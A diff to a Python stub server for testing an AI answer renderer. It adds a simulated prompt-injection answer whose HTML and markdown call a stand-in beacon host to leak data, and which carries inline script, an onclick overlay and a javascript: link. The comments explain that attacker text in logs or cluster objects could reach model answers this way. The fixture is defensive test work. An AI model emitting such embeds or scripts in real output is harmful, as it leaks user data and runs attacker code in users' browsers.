@@ -35,6 +35,38 @@ PORT = int(os.environ.get("DOT_AI_STUB_PORT", "8080"))
 UPSTREAM_SECRET_MARKER = "UPSTREAM_SECRET_STACK_DO_NOT_LEAK"
 UPSTREAM_INTERNAL_FIELD = "raw_upstream_internal_do_not_leak"
 
+# Indirect prompt-injection payload: what a crafted Loki line, alert annotation, or
+# Kubernetes object name could realistically get echoed into a model answer. Served on
+# TRIGGER_INJECTION_MARKDOWN so the renderer's allowlist is exercised through the real
+# page instead of only in jsdom. The beacon host is `.invalid` (RFC 6761 — never
+# resolves), so a surviving embed shows up as an outbound request the spec counts,
+# never as traffic to a real third party.
+INJECTION_BEACON_HOST = "beacon.evil.invalid"
+INJECTION_ANSWER = "\n".join(
+    [
+        "INJECTED_ANSWER_START",
+        "",
+        "## Cluster findings",
+        "",
+        "- pod api-7d9 is CrashLooping",
+        "",
+        f'<img src="https://{INJECTION_BEACON_HOST}/pixel.gif?e=leak">',
+        f'<iframe src="https://{INJECTION_BEACON_HOST}/frame" width="1" height="1"></iframe>',
+        f'<link rel="stylesheet" href="https://{INJECTION_BEACON_HOST}/x.css">',
+        "<script>window.__pwned = 'script';</script>",
+        '<div onclick="window.__pwned = \'handler\'" '
+        'style="position:fixed;top:0;left:0;width:100vw;height:100vh">overlay</div>',
+        "",
+        f"![beacon](https://{INJECTION_BEACON_HOST}/md.gif)",
+        "",
+        "[click me](javascript:window.__pwned='jsurl')",
+        "",
+        "[runbook](https://runbooks.example/crashloop)",
+        "",
+        "INJECTED_ANSWER_END",
+    ]
+)
+
 _lock = threading.Lock()
 _hits: dict[str, int] = {
     "version": 0,
@@ -192,6 +224,16 @@ class Handler(BaseHTTPRequestHandler):
                     "error": {"message": "upstream unauthorized"},
                     "debug_stack": UPSTREAM_SECRET_MARKER,
                     UPSTREAM_INTERNAL_FIELD: UPSTREAM_SECRET_MARKER,
+                },
+            )
+            return
+        if "TRIGGER_INJECTION_MARKDOWN" in text:
+            # Answer text is fully attacker-influenceable; the renderer must treat it so.
+            self._write(
+                200,
+                {
+                    "success": True,
+                    "data": {"result": {"summary": INJECTION_ANSWER}},
                 },
             )
             return
